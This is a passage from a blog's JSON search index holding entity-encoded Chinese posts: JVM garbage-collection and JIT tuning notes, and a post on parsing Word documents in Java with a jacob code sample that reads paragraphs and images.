-XX:MinHeapFreeRatio&#xFF1A;&#x8BBE;&#x7F6E;&#x5806;&#x7A7A;&#x95F4;&#x7684;&#x6700;&#x5C0F;&#x7A7A;&#x95F2;&#x6BD4;&#x4F8B;&#xFF0C;&#x5F53;&#x5806;&#x7A7A;&#x95F4;&#x7684;&#x7A7A;&#x95F2;&#x5185;&#x5B58;&#x5C0F;&#x4E8E;&#x8FD9;&#x4E2A;&#x6570;&#x503C;&#x65F6;&#xFF0C;JVM&#x4FBF;&#x4F1A;&#x6269;&#x5C55;&#x5806;&#x7A7A;&#x95F4; -XX:MaxHeapFreeRatio&#xFF1A;&#x8BBE;&#x7F6E;&#x5806;&#x7A7A;&#x95F4;&#x7684;&#x6700;&#x5927;&#x7A7A;&#x95F2;&#x6BD4;&#x4F8B;&#xFF0C;&#x5F53;&#x5806;&#x7A7A;&#x95F4;&#x7684;&#x7A7A;&#x95F2;&#x5185;&#x5B58;&#x5927;&#x4E8E;&#x8FD9;&#x4E2A;&#x6570;&#x503C;&#x65F6;&#xFF0C;JVM&#x4FBF;&#x4F1A;&#x538B;&#x7F29;&#x5806;&#x7A7A;&#x95F4; &#x65B0;&#x751F;&#x4EE3;&#x4E32;&#x884C;GC&#xFF1A;&#x4F7F;&#x7528;&#x590D;&#x5236;&#x7B97;&#x6CD5;&#xFF0C;&#x5355;&#x7EBF;&#x7A0B;STW&#x65B0;&#x751F;&#x4EE3;&#x5E76;&#x884C;&#x56DE;&#x6536;GC&#xFF1A;&#x4F7F;&#x7528;&#x590D;&#x5236;&#x7B97;&#x6CD5;&#xFF0C;&#x591A;&#x7EBF;&#x7A0B;STW&#xFF0C;&#x541E;&#x5410;&#x91CF;&#x4F18;&#x5148;&#xFF1A;&#x81EA;&#x52A8;&#x8C03;&#x6574;&#x65B0;&#x751F;&#x4EE3;Eden&#x3001;S0&#x3001;S1&#x5927;&#x5C0F;&#x65B0;&#x751F;&#x4EE3;&#x5E76;&#x884C;GC&#xFF1A;&#x4F7F;&#x7528;&#x590D;&#x5236;&#x7B97;&#x6CD5;&#xFF0C;&#x591A;&#x7EBF;&#x7A0B;STW&#xFF0C;&#x65B0;&#x751F;&#x4EE3;&#x4E32;&#x884C;GC&#x7684;&#x591A;&#x7EBF;&#x7A0B;&#x7248;&#x672C;&#x8001;&#x5E74;&#x4EE3;&#x4E32;&#x884C;GC&#xFF1A;&#x4F7F;&#x7528;&#x6807;&#x8BB0;&#x538B;&#x7F29;&#x7B97;&#x6CD5;&#xFF0C;&#x5355;&#x7EBF;&#x7A0B;STW&#x8001;&#x5E74;&#x4EE3;&#x5E76;&#x884C;&#x56DE;&#x6536;GC&#xFF1A;&#x4F7F;&#x7528;&#x6807;&#x8BB0;&#x538B;&#x7F29;&#x7B97;&#x6CD5;&#xFF0C;&#x591A;&#x7EBF;&#x7A0B;STW &#xFF0C;&#x538B;&#x7F29;&#x65B9;&#x5F0F;&#x6BD4;&#x8F83;&#x7279;&#x522B;&#xFF0C;&#x5185;&#x5B58;&#x6309;&#x7EBF;&#x7A0B;&#x6570;&#x5212;&#x5206;&#x6210;&#x4E0D;&#x540C;&#x533A;&#x57DF;&#xFF0C;&#x538B;&#x7F29;&#x65F6;&#x6839;&#x636E;&#x533A;&#x57DF;&#x5B58;&#x6D3B;&#x5BF9;&#x8C61;&#x6BD4;&#x4F8B;&#x51B3;&#x5B9A;&#x662F;&#x5426;&#x6574;&#x5757;&#x538B;&#x7F29;&#x8001;&#x5E74;&#x4EE3;&#x5E76;&#x53D1;GC&#xFF1A;&#x4F7F;&#x7528;&#x6807;&#x8BB0;&#x6E05;&#x9664;&#x7B97;&#x6CD5;&#x3002;&#x95EE;&#x9898;&#xFF1A;&#x2460; &#x5360;&#x7528;&#x66F4;&#x591A;CPU&#xFF1B;&#x2461; &#x6D6E;&#x52A8;&#x5783;&#x573E;&#xFF1B;&#x2462; &#x5185;&#x5B58;&#x788E;&#x7247;&#xFF1A;&#x652F;&#x6301;Full GC&#x540E;&#x7684;&#x788E;&#x7247;&#x6574;&#x7406;&#x6E05;&#x9664;&#xFF0C;&#x591A;&#x7EBF;&#x7A0B;&#x4E0D;STW&#xFF0C;&#x4F46;&#x662F;&#x788E;&#x7247;&#x6574;&#x7406;&#x662F;STW&#xFF1B; &#x2003;&#x8BF4;&#x660E;&#xFF1A;&#x2460; -XX:+UserSerialGC&#x4E3A;client&#x9ED8;&#x8BA4;&#x65B9;&#x5F0F;&#xFF0C;-XX:+UseParallelOldGC&#x4E3A;server&#x9ED8;&#x8BA4;&#x65B9;&#x5F0F;&#xFF1B;&#x2461; &#x5206;&#x5B58;&#x5206;&#x914D;&#x65B9;&#x5F0F;&#xFF1A;&#x6307;&#x9488;&#x78B0;&#x649E;(bump-the-pointer)&#x3001;&#x7A7A;&#x95F2;&#x5217;&#x8868;(free list)&#x3001;TLAB&#xFF1B;&#x2462; &#x6839;&#x96C6;&#x5408;&#x626B;&#x63CF;&#x52A0;&#x901F;&#xFF1A;Card Table&#x3001;Mod Union Table&#x3001;Remembered Set&#xFF1B;&#x2463; &#x65B0;&#x751F;&#x4EE3;&#x5E76;&#x884C;&#x56DE;&#x6536;GC&#x6CA1;&#x6709;&#x5BF9;Mod Union Table&#x8FDB;&#x884C;&#x5904;&#x7406;&#xFF0C;&#x56E0;&#x6B64;&#x4E0D;&#x80FD;&#x548C;&#x8001;&#x5E74;&#x4EE3;&#x5E76;&#x53D1;GC&#x4E00;&#x8D77;&#x5DE5;&#x4F5C;&#xFF1B;&#x2464; &#x4F7F;&#x7528; -XX:+HeapDumpOnOutOfMemoryError&#x5F00;&#x542F;&#x5806;Dump&#xFF1B; &#x4F18;&#x5316;&#x65B9;&#x6848;&#xFF1A;&#x2460; &#x7ED9;&#x65B0;&#x751F;&#x4EE3;&#x5206;&#x914D;&#x8F83;&#x5927;&#x7A7A;&#x95F4;&#xFF0C;&#x56E0;&#x4E3A;Full GC&#x6BD4;Mirror GC&#x6210;&#x672C;&#x9AD8;&#xFF1B;&#x2461; &#x65B0;&#x751F;&#x4EE3;&#x8FDB;&#x5165;&#x8001;&#x5E74;&#x4EE3;&#x7684;&#x5E74;&#x9F84;&#x8BBE;&#x7F6E;&#x8F83;&#x5927;&#x503C;&#xFF0C;&#x539F;&#x56E0;&#x540C;&#x4E0A;&#xFF1B;&#x2462; &#x8BBE;&#x7F6E;&#x5927;&#x5BF9;&#x8C61;&#x76F4;&#x63A5;&#x8FDB;&#x5165;&#x8001;&#x5E74;&#x4EE3;&#xFF0C;&#x56E0;&#x4E3A;&#x65B0;&#x751F;&#x4EE3;&#x4F7F;&#x7528;&#x590D;&#x5236;&#x7B97;&#x6CD5;&#xFF0C;&#x5E76;&#x4E14;&#x5360;&#x7528;&#x4E24;&#x500D;&#x7A7A;&#x95F4;&#xFF0C;&#x5927;&#x5BF9;&#x8C61;&#x6210;&#x672C;&#x9AD8;&#xFF1B;&#x2463; &#x6700;&#x5927;&#x548C;&#x6700;&#x5C0F;&#x5806;&#x5927;&#x5C0F;&#x8BBE;&#x7F6E;&#x6210;&#x4E00;&#x6837;&#xFF0C;&#x907F;&#x514D;&#x5806;&#x7684;&#x8C03;&#x6574;&#xFF1B;&#x2464; &#x541E;&#x5410;&#x91CF;&#x4F18;&#x5148;&#x6A21;&#x5F0F;&#xFF1A;&#x5E76;&#x884C;&#x56DE;&#x6536;GC&#xFF1B;&#x2465; &#x54CD;&#x5E94;&#x65F6;&#x95F4;&#x4F18;&#x5148;&#x6A21;&#x5F0F;&#xFF1A;&#x5E76;&#x53D1;GC&#xFF1B; 2.4&#x3001;&#x6267;&#x884C;&#x673A;&#x5236;2.4.1&#x3001;&#x89E3;&#x91CA;&#x6267;&#x884C;1) &#x6808;&#x9876;&#x7F13;&#x5B58;&#xFF1A;&#x5C06;&#x64CD;&#x4F5C;&#x6570;&#x6808;&#x9876;&#x4E2D;&#x503C;&#x76F4;&#x63A5;&#x7F13;&#x5B58;&#x5728;&#x5BC4;&#x5B58;&#x5668;&#x4E0A;&#xFF0C;&#x8BA1;&#x7B97;&#x540E;&#x653E;&#x56DE;&#x64CD;&#x4F5C;&#x6570;&#x6808;2) &#x90E8;&#x5206;&#x6808;&#x5E27;&#x5171;&#x4EAB;&#xFF1A;&#x8C03;&#x7528;&#x65B9;&#x6CD5;&#x65F6;&#xFF0C;&#x540E;&#x4E00;&#x65B9;&#x6CD5;&#x53EF;&#x5C06;&#x524D;&#x4E00;&#x65B9;&#x6CD5;&#x7684;&#x64CD;&#x4F5C;&#x6570;&#x6808;&#x4F5C;&#x4E3A;&#x5F53;&#x524D;&#x65B9;&#x6CD5;&#x7684;&#x5C40;&#x90E8;&#x53D8;&#x91CF;&#xFF0C;&#x8282;&#x7701;&#x6570;&#x636E;&#x62F7;&#x8D1D;&#x6D88;&#x8017; 2.4.2&#x3001;&#x7F16;&#x8BD1;&#x6267;&#x884C;&#x5BF9;&#x9891;&#x7E41;&#x6267;&#x884C;&#x7684;&#x4EE3;&#x7801;&#x7F16;&#x8BD1;&#x4E3A;&#x673A;&#x5668;&#x7801;&#xFF0C;&#x5BF9;&#x4E0D;&#x9891;&#x7E41;&#x6267;&#x884C;&#x7684;&#x4EE3;&#x7801;&#x7EE7;&#x7EED;&#x4F7F;&#x7528;&#x89E3;&#x91CA;&#x65B9;&#x5F0F;&#xFF0C;&#x53EF;&#x901A;&#x8FC7;CompileThreshold&#x3001;OnStackReplacePercentage&#x4E24;&#x4E2A;&#x8BA1;&#x6570;&#x5668;&#x8FDB;&#x884C;&#x914D;&#x7F6E; 1) client&#x7F16;&#x8BD1;&#xFF08;C1&#xFF09;&#xFF1A;&#x65B9;&#x6CD5;&#x5185;&#x8054;&#xFF1A;&#x65B9;&#x6CD5;&#x8F83;&#x77ED;&#x65F6;&#xFF0C;&#x5C06;&#x88AB;&#x8C03;&#x7528;&#x65B9;&#x6CD5;&#x7684;&#x6307;&#x4EE4;&#x76F4;&#x63A5;&#x690D;&#x5165;&#x5F53;&#x524D;&#x65B9;&#x6CD5;&#x53BB;&#x865A;&#x62DF;&#x5316;&#xFF1A;&#x5982;&#x53D1;&#x73B0;&#x7C7B;&#x4E2D;&#x7684;&#x65B9;&#x6CD5;&#x53EA;&#x63D0;&#x4F9B;&#x4E00;&#x4E2A;&#x5B9E;&#x73B0;&#x7C7B;&#xFF0C;&#x5219;&#x5BF9;&#x8C03;&#x7528;&#x65B9;&#x8FDB;&#x884C;&#x5185;&#x8054;&#x5197;&#x4F59;&#x524A;&#x9664;&#xFF1A;&#x6839;&#x636E;&#x8FD0;&#x884C;&#x65F6;&#x72B6;&#x51B5;&#x5BF9;&#x4EE3;&#x7801;&#x8FDB;&#x884C;&#x6298;&#x53E0;&#x6216;&#x524A;&#x9664; 2) server&#x7F16;&#x8BD1;&#xFF08;C2&#xFF09;&#xFF1A;&#x901A;&#x8FC7;&#x8FD0;&#x884C;&#x65F6;&#x4FE1;&#x606F;&#xFF0C;&#x5982;&#x5206;&#x652F;&#x5224;&#x65AD;&#xFF08;&#x4F18;&#x5148;&#x6267;&#x884C;&#x9891;&#x7387;&#x9AD8;&#x7684;&#x5206;&#x652F;&#xFF09;&#x548C;&#x9003;&#x9038;&#x5206;&#x6790;&#xFF08;&#x53D8;&#x91CF;&#x662F;&#x5426;&#x88AB;&#x5916;&#x90E8;&#x8BFB;&#x53D6;&#xFF09;&#x7B49;&#x8FDB;&#x884C;&#x4F18;&#x5316; &#x6807;&#x91CF;&#x66FF;&#x6362;&#xFF1A;&#x672A;&#x7528;&#x5230;&#x5BF9;&#x8C61;&#x7684;&#x5168;&#x90E8;&#x53D8;&#x91CF;&#x65F6;&#xFF0C;&#x7528;&#x6807;&#x91CF;&#x66FF;&#x6362;&#x805A;&#x5408;&#x91CF;&#xFF0C;&#x907F;&#x514D;&#x521B;&#x5EFA;&#x5BF9;&#x8C61;&#xFF0C;&#x8282;&#x7701;&#x5185;&#x5B58;&#xFF0C;&#x4F18;&#x5316;&#x6267;&#x884C;&#x6808;&#x4E0A;&#x5206;&#x914D;&#xFF1A;&#x5BF9;&#x8C61;&#x672A;&#x9003;&#x9038;&#x65F6;&#xFF0C;&#x76F4;&#x63A5;&#x5728;&#x6808;&#x4E0A;&#x521B;&#x5EFA;&#x5BF9;&#x8C61;&#xFF0C;&#x4F18;&#x5316;&#x6267;&#x884C;&#x540C;&#x6B65;&#x524A;&#x9664;&#xFF1A;&#x5BF9;&#x8C61;&#x672A;&#x9003;&#x9038;&#x65F6;&#xFF0C;C2&#x76F4;&#x63A5;&#x53BB;&#x6389;&#x540C;&#x6B65; 3) OSR&#x7F16;&#x8BD1;&#xFF08;On-Stack Replacement&#xFF09;&#xFF1A;&#x53EA;&#x5728;&#x5FAA;&#x73AF;&#x4EE3;&#x7801;&#x4F53;&#x90E8;&#x5206;&#x7F16;&#x8BD1;&#xFF0C;&#x5176;&#x5B83;&#x90E8;&#x5206;&#x4ECD;&#x7136;&#x662F;&#x89E3;&#x91CA;&#x6267;&#x884C; &#x2003; 2.4.3&#x3001;&#x9006;&#x4F18;&#x5316;C1&#x3001;C2&#x4E0D;&#x6EE1;&#x8DB3;&#x4F18;&#x5316;&#x6761;&#x4EF6;&#x65F6;&#xFF0C;&#x8FDB;&#x884C;&#x9006;&#x4F18;&#x5316;&#x56DE;&#x5230;&#x89E3;&#x91CA;&#x6267;&#x884C;&#x6A21;&#x5F0F; 2.4.4&#x3001;&#x53CD;&#x5C04;&#x6267;&#x884C;1) &#x7531;&#x4E8E;&#x6743;&#x9650;&#x6821;&#x9A8C;&#x3001;&#x6240;&#x6709;&#x65B9;&#x6CD5;&#x626B;&#x63CF;&#x53CA;Method&#x5BF9;&#x8C61;&#x7684;&#x590D;&#x5236;&#xFF0C;getMethod()&#x65B9;&#x6CD5;&#x6BD4;&#x8F83;&#x6D88;&#x8017;&#x6027;&#x80FD;&#xFF0C;&#x5E94;&#x8BE5;&#x7F13;&#x5B58;&#x8FD4;&#x56DE;&#x7684;Method&#x5BF9;&#x8C61;&#xFF1B;2) Method.invoke()&#x7684;&#x6027;&#x80FD;&#x74F6;&#x9888;&#xFF1A;&#x53C2;&#x6570;&#x7684;&#x6570;&#x7EC4;&#x5305;&#x88C5;&#x3001;&#x65B9;&#x6CD5;&#x53EF;&#x89C1;&#x6027;&#x68C0;&#x67E5;&#x3001;&#x53C2;&#x6570;&#x7684;&#x7C7B;&#x578B;&#x68C0;&#x67E5;&#x3002;&#x53EF;&#x901A;&#x8FC7;JDK7&#x7684;MethodHandle&#x63D0;&#x9AD8;&#x6027;&#x80FD;&#xFF1B;","raw":null,"content":null,"categories":[{"name":"WEB后端","slug":"WEB后端","permalink":"http://www.wangxin123.com/categories/WEB后端/"}],"tags":[{"name":"虚拟机","slug":"虚拟机","permalink":"http://www.wangxin123.com/tags/虚拟机/"}]},{"title":"Java解析word文档","slug":"Java解析word文档","date":"2016-09-10T10:53:00.000Z","updated":"2017-01-09T06:58:10.624Z","comments":true,"path":"2016/09/10/Java解析word文档/","link":"","permalink":"http://www.wangxin123.com/2016/09/10/Java解析word文档/","excerpt":"&#x80CC;&#x666F;&#x5728;&#x4E92;&#x8054;&#x7F51;K12&#x9886;&#x57DF;&#xFF0C;&#x505A;&#x9898;&#x5E93;&#x9879;&#x76EE;&#x7ECF;&#x5E38;&#x78B0;&#x5230;&#x7684;&#x4E00;&#x4E2A;&#x95EE;&#x9898;&#x5C31;&#x662F;&#x5982;&#x4F55;&#x89E3;&#x6790;word&#x6587;&#x6863;&#x3002; &#x5982;&#x679C;&#x7A0B;&#x5E8F;&#x65E0;&#x6CD5;&#x667A;&#x80FD;&#x7684;&#x5C06;&#x4E00;&#x5957;&#x4E00;&#x5957;&#x7684;&#x8BD5;&#x5377;&#x6587;&#x6863;&#x89E3;&#x6790;&#x6210;&#x76F8;&#x5E94;&#x7684;&#x8BD5;&#x9898;&#x6570;&#x636E;&#xFF0C;&#x90A3;&#x4E48;&#x8001;&#x5E08;&#x5C31;&#x53EA;&#x80FD;&#x7EBF;&#x4E0B;&#x624B;&#x52A8;&#x901A;&#x8FC7;&#x5E73;&#x53F0;&#x5F55;&#x5165;&#x9898;&#x76EE;&#xFF0C;&#x8FD9;&#x4E2A;&#x8FC7;&#x7A0B;&#x53CA;&#x5176;&#x7E41;&#x7410;&#x800C;&#x4E14;&#x5B58;&#x5728;&#x4E00;&#x5B9A;&#x7684;&#x5931;&#x8BEF;&#x7387;&#x3002; &#x5B9E;&#x73B0;&#x96BE;&#x70B9;&#x73B0;&#x5728;&#x56DE;&#x60F3;&#x6574;&#x4E2A;&#x89E3;&#x6790;&#x8FC7;&#x7A0B;&#xFF0C;&#x9047;&#x5230;&#x7684;&#x56F0;&#x96BE;&#x4E3B;&#x8981;&#x96C6;&#x4E2D;&#x5728;&#x4EE5;&#x4E0B;&#x51E0;&#x4E2A;&#x65B9;&#x9762;: word&#x4E0D;&#x5F00;&#x6E90;&#xFF0C;&#x5E38;&#x89C4;&#x65B9;&#x6CD5;&#x53EA;&#x80FD;&#x89E3;&#x6790;&#x7EAF;&#x6587;&#x672C;&#x4FE1;&#x606F;&#xFF0C;&#x89E3;&#x6790;&#x7684;&#x65B9;&#x6848;&#x96BE;&#x4EE5;&#x786E;&#x5B9A;&#x3002; word&#x6587;&#x6863;&#x7684;&#x56FE;&#x7247;&#x5982;&#x4F55;&#x8BFB;&#x53D6;&#xFF0C;&#x56FE;&#x7247;&#x53EF;&#x80FD;&#x7531;&#x5176;&#x5B83;&#x5730;&#x65B9;&#x590D;&#x5236;&#x7C98;&#x8D34;&#x8FC7;&#x6765;&#xFF0C;&#x4E5F;&#x53EF;&#x80FD;&#x7528;&#x7684;&#x662F;word&#x81EA;&#x5E26;&#x7684;&#x753B;&#x56FE;&#x5DE5;&#x5177;&#xFF0C;&#x4E0D;&#x540C;&#x6765;&#x6E90;&#x5904;&#x7406;&#x65B9;&#x5F0F;&#x4E0D;&#x540C;&#x3002;&#x4E14;&#x8BFB;&#x53D6;&#x7684;&#x65F6;&#x5019;&#x662F;&#x5426;&#x80FD;&#x6709;&#x6548;&#x83B7;&#x53D6;&#x56FE;&#x7247;&#x7684;&#x4F4D;&#x7F6E;&#x53CA;&#x5927;&#x5C0F;&#x4FE1;&#x606F;&#xFF1F;&#x65B9;&#x4FBF;&#x540E;&#x671F;&#x8BD5;&#x9898;&#x6392;&#x7248;&#x3002; word&#x6587;&#x6863;&#x7684;&#x516C;&#x5F0F;&#x5982;&#x4F55;&#x8BFB;&#x53D6;&#xFF0C;&#x516C;&#x5F0F;&#x7684;&#x6765;&#x6E90;&#x53EF;&#x80FD;&#x662F;&#x5E38;&#x89C4;&#x8F93;&#x5165;&#x6CD5;&#xFF0C;&#x53EF;&#x80FD;&#x662F;MathType&#x63D2;&#x4EF6;&#xFF0C;&#x53EF;&#x80FD;&#x662F;word&#x7684;&#x81EA;&#x5E26;&#x516C;&#x5F0F;&#xFF0C;&#x4E0D;&#x540C;&#x6765;&#x6E90;&#x5904;&#x7406;&#x65B9;&#x5F0F;&#x4E5F;&#x4E0D;&#x540C;&#x3002; word&#x6587;&#x6863;&#x683C;&#x5F0F;&#x5F88;&#x4E0D;&#x89C4;&#x8303;&#xFF0C;&#x6BD4;&#x5982;&#x8BD5;&#x9898;&#x7684;&#x9898;&#x5E8F;&#xFF0C;&#x683C;&#x5F0F;&#x53EF;&#x80FD;&#x5C31;&#x6709;&#x56DB;&#x4E94;&#x79CD;&#xFF0C;&#x8089;&#x773C;&#x8FD8;&#x65E0;&#x6CD5;&#x8BC6;&#x522B;&#x533A;&#x5206;&#x3002;&#x7A0B;&#x5E8F;&#x53EA;&#x53EF;&#x80FD;&#x5C3D;&#x91CF;&#x8986;&#x76D6;&#x7EDD;&#x5927;&#x90E8;&#x5206;&#x60C5;&#x51B5;&#xFF0C;&#x8003;&#x8651;&#x7684;&#x60C5;&#x51B5;&#x8D8A;&#x591A;&#xFF0C;&#x89E3;&#x6790;&#x7387;&#x8D8A;&#x9AD8;&#x3002;","keywords":null,"text":"&#x80CC;&#x666F;&#x5728;&#x4E92;&#x8054;&#x7F51;K12&#x9886;&#x57DF;&#xFF0C;&#x505A;&#x9898;&#x5E93;&#x9879;&#x76EE;&#x7ECF;&#x5E38;&#x78B0;&#x5230;&#x7684;&#x4E00;&#x4E2A;&#x95EE;&#x9898;&#x5C31;&#x662F;&#x5982;&#x4F55;&#x89E3;&#x6790;word&#x6587;&#x6863;&#x3002; &#x5982;&#x679C;&#x7A0B;&#x5E8F;&#x65E0;&#x6CD5;&#x667A;&#x80FD;&#x7684;&#x5C06;&#x4E00;&#x5957;&#x4E00;&#x5957;&#x7684;&#x8BD5;&#x5377;&#x6587;&#x6863;&#x89E3;&#x6790;&#x6210;&#x76F8;&#x5E94;&#x7684;&#x8BD5;&#x9898;&#x6570;&#x636E;&#xFF0C;&#x90A3;&#x4E48;&#x8001;&#x5E08;&#x5C31;&#x53EA;&#x80FD;&#x7EBF;&#x4E0B;&#x624B;&#x52A8;&#x901A;&#x8FC7;&#x5E73;&#x53F0;&#x5F55;&#x5165;&#x9898;&#x76EE;&#xFF0C;&#x8FD9;&#x4E2A;&#x8FC7;&#x7A0B;&#x53CA;&#x5176;&#x7E41;&#x7410;&#x800C;&#x4E14;&#x5B58;&#x5728;&#x4E00;&#x5B9A;&#x7684;&#x5931;&#x8BEF;&#x7387;&#x3002; &#x5B9E;&#x73B0;&#x96BE;&#x70B9;&#x73B0;&#x5728;&#x56DE;&#x60F3;&#x6574;&#x4E2A;&#x89E3;&#x6790;&#x8FC7;&#x7A0B;&#xFF0C;&#x9047;&#x5230;&#x7684;&#x56F0;&#x96BE;&#x4E3B;&#x8981;&#x96C6;&#x4E2D;&#x5728;&#x4EE5;&#x4E0B;&#x51E0;&#x4E2A;&#x65B9;&#x9762;: word&#x4E0D;&#x5F00;&#x6E90;&#xFF0C;&#x5E38;&#x89C4;&#x65B9;&#x6CD5;&#x53EA;&#x80FD;&#x89E3;&#x6790;&#x7EAF;&#x6587;&#x672C;&#x4FE1;&#x606F;&#xFF0C;&#x89E3;&#x6790;&#x7684;&#x65B9;&#x6848;&#x96BE;&#x4EE5;&#x786E;&#x5B9A;&#x3002; word&#x6587;&#x6863;&#x7684;&#x56FE;&#x7247;&#x5982;&#x4F55;&#x8BFB;&#x53D6;&#xFF0C;&#x56FE;&#x7247;&#x53EF;&#x80FD;&#x7531;&#x5176;&#x5B83;&#x5730;&#x65B9;&#x590D;&#x5236;&#x7C98;&#x8D34;&#x8FC7;&#x6765;&#xFF0C;&#x4E5F;&#x53EF;&#x80FD;&#x7528;&#x7684;&#x662F;word&#x81EA;&#x5E26;&#x7684;&#x753B;&#x56FE;&#x5DE5;&#x5177;&#xFF0C;&#x4E0D;&#x540C;&#x6765;&#x6E90;&#x5904;&#x7406;&#x65B9;&#x5F0F;&#x4E0D;&#x540C;&#x3002;&#x4E14;&#x8BFB;&#x53D6;&#x7684;&#x65F6;&#x5019;&#x662F;&#x5426;&#x80FD;&#x6709;&#x6548;&#x83B7;&#x53D6;&#x56FE;&#x7247;&#x7684;&#x4F4D;&#x7F6E;&#x53CA;&#x5927;&#x5C0F;&#x4FE1;&#x606F;&#xFF1F;&#x65B9;&#x4FBF;&#x540E;&#x671F;&#x8BD5;&#x9898;&#x6392;&#x7248;&#x3002; word&#x6587;&#x6863;&#x7684;&#x516C;&#x5F0F;&#x5982;&#x4F55;&#x8BFB;&#x53D6;&#xFF0C;&#x516C;&#x5F0F;&#x7684;&#x6765;&#x6E90;&#x53EF;&#x80FD;&#x662F;&#x5E38;&#x89C4;&#x8F93;&#x5165;&#x6CD5;&#xFF0C;&#x53EF;&#x80FD;&#x662F;MathType&#x63D2;&#x4EF6;&#xFF0C;&#x53EF;&#x80FD;&#x662F;word&#x7684;&#x81EA;&#x5E26;&#x516C;&#x5F0F;&#xFF0C;&#x4E0D;&#x540C;&#x6765;&#x6E90;&#x5904;&#x7406;&#x65B9;&#x5F0F;&#x4E5F;&#x4E0D;&#x540C;&#x3002; word&#x6587;&#x6863;&#x683C;&#x5F0F;&#x5F88;&#x4E0D;&#x89C4;&#x8303;&#xFF0C;&#x6BD4;&#x5982;&#x8BD5;&#x9898;&#x7684;&#x9898;&#x5E8F;&#xFF0C;&#x683C;&#x5F0F;&#x53EF;&#x80FD;&#x5C31;&#x6709;&#x56DB;&#x4E94;&#x79CD;&#xFF0C;&#x8089;&#x773C;&#x8FD8;&#x65E0;&#x6CD5;&#x8BC6;&#x522B;&#x533A;&#x5206;&#x3002;&#x7A0B;&#x5E8F;&#x53EA;&#x53EF;&#x80FD;&#x5C3D;&#x91CF;&#x8986;&#x76D6;&#x7EDD;&#x5927;&#x90E8;&#x5206;&#x60C5;&#x51B5;&#xFF0C;&#x8003;&#x8651;&#x7684;&#x60C5;&#x51B5;&#x8D8A;&#x591A;&#xFF0C;&#x89E3;&#x6790;&#x7387;&#x8D8A;&#x9AD8;&#x3002; Java&#x89E3;&#x51B3;&#x65B9;&#x6848;&#x524D;&#x671F;&#x8003;&#x8651;&#x7528;Java&#x6765;&#x89E3;&#x6790;word&#xFF0C;&#x7F51;&#x4E0A;&#x641C;&#x7D22;&#x65B9;&#x6848;&#x4E3B;&#x8981;&#x6709;&#x5982;&#x4E0B;&#x51E0;&#x79CD;&#xFF1A; jacob&#xFF1A;&#x7F51;&#x4E0A;&#x8D44;&#x6599;&#x8F83;&#x5C11;&#xFF0C;&#x76EE;&#x524D;&#x5DF2;&#x7ECF;&#x5B9E;&#x73B0;&#x7684;&#x662F;&#x7528;jacob&#x89E3;&#x6790;mathtype&#x8F93;&#x5165;&#x7684;&#x516C;&#x5F0F;&#xFF0C;&#x7136;&#x540E;&#x8C03;&#x7528;word&#x5B8F;&#x547D;&#x4EE4;&#x8F6C;&#x6210;latex&#xFF0C;&#x4F46;jacob&#x65E0;&#x6CD5;&#x89E3;&#x6790;word&#x81EA;&#x5E26;&#x7684;&#x516C;&#x5F0F;&#x3002;jacob&#x4E5F;&#x53EF;&#x4EE5;&#x5B9A;&#x4F4D;word&#x56FE;&#x7247;&#x603B;&#x6570;&#x53CA;word&#x56FE;&#x7247;&#x4F4D;&#x7F6E;&#xFF0C;&#x4F46;&#x76EE;&#x524D;&#x6CA1;&#x627E;&#x5230;&#x5C06;&#x56FE;&#x7247;&#x53E6;&#x5B58;&#x672C;&#x5730;&#x7684;&#x65B9;&#x6CD5;&#x3002; poi&#xFF1A;&#x60C5;&#x51B5;&#x4E0E;jacob&#x7C7B;&#x4F3C;&#x3002; Aspose.Words&#xFF1A;&#x4E00;&#x4E2A;&#x5546;&#x4E1A;&#x6536;&#x8D39;&#x7C7B;&#x5E93;&#xFF0C;&#x53EF;&#x4EE5;&#x4F7F;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x5904;&#x7406;&#x5927;&#x91CF;&#x7684;&#x6587;&#x4EF6;&#x4EFB;&#x52A1;&#xFF0C;&#x652F;&#x6301;word&#x3001;pdf&#x7B49;&#x5404;&#x79CD;&#x683C;&#x5F0F;&#x64CD;&#x4F5C;&#x3002;&#x4F46;&#x662F;&#x770B;&#x6587;&#x6863;&#x4ECB;&#x7ECD;&#x6CA1;&#x6709;&#x5173;&#x4E8E;&#x516C;&#x5F0F;&#x7684;&#x5904;&#x7406;&#x65B9;&#x6848;&#x3002; &#x4EE5;&#x4E0B;&#x662F;&#x5B9A;&#x4F4D;word&#x56FE;&#x7247;&#x603B;&#x6570;&#x53CA;&#x5176;&#x4F4D;&#x7F6E;&#x7684;&#x4EE3;&#x7801;&#xFF0C;&#x66F4;&#x591A;&#x8BE6;&#x60C5;&#x8BF7;&#x6233; http://www.cnblogs.com/x_wukong/p/4270867.html123456789101112131415161718192021222324252627282930313233343536373839404142434445package com.latex.test;import com.jacob.activeX.ActiveXComponent;import com.jacob.com.Dispatch;import com.jacob.com.Variant;public class test { public static void main(String[] args) { long time1 = System.currentTimeMillis(); ActiveXComponent word = new ActiveXComponent(&quot;Word.Application&quot;); Dispatch wordObject = (Dispatch) word.getObject(); Dispatch.put((Dispatch) wordObject, &quot;Visible&quot;, new Variant(false)); Dispatch documents = word.getProperty(&quot;Documents&quot;).toDispatch(); Dispatch document = Dispatch.call(documents, &quot;Open&quot;, &quot;D://test.docx&quot;).toDispatch(); Dispatch wordContent = Dispatch.get(document, &quot;Content&quot;).toDispatch(); Dispatch paragraphs = Dispatch.get(wordContent, &quot;Paragraphs&quot;).toDispatch(); int paragraphCount = Dispatch.get(paragraphs, &quot;Count&quot;).getInt();// &#x603B;&#x884C;&#x6570; for (int i = 1; i &lt;= paragraphCount; i++) { Dispatch paragraph = Dispatch.call(paragraphs, &quot;Item&quot;, new Variant(i)).toDispatch(); Dispatch paragraphRange = Dispatch.get(paragraph, &quot;Range&quot;).toDispatch(); String paragraphContent = Dispatch.get(paragraphRange, &quot;Text&quot;).toString(); System.out.println(paragraphContent);//&#x6253;&#x5370;&#x6BCF;&#x884C;&#x5185;&#x5BB9; Dispatch imgDispatch = Dispatch.get(paragraphRange, &quot;InlineShapes&quot;).toDispatch();//&#x56FE;&#x7247; int imgCount = Dispatch.get(imgDispatch, &quot;Count&quot;).getInt(); System.out.println(&quot;&#x7B2C;&quot; + i +&quot;&#x884C;&#x56FE;&#x7247;&#x603B;&#x6570;&quot; + imgCount); for(int j=1;j&lt;imgCount+1;j++){ Dispatch shape = Dispatch.call(imgDispatch, &quot;Item&quot;, new Variant(1)).toDispatch(); Dispatch imageRange = Dispatch.get(shape, &quot;Range&quot;).toDispatch(); Dispatch.call(imageRange, &quot;Copy&quot;); Dispatch.call(imageRange, &quot;Paste&quot;); } } 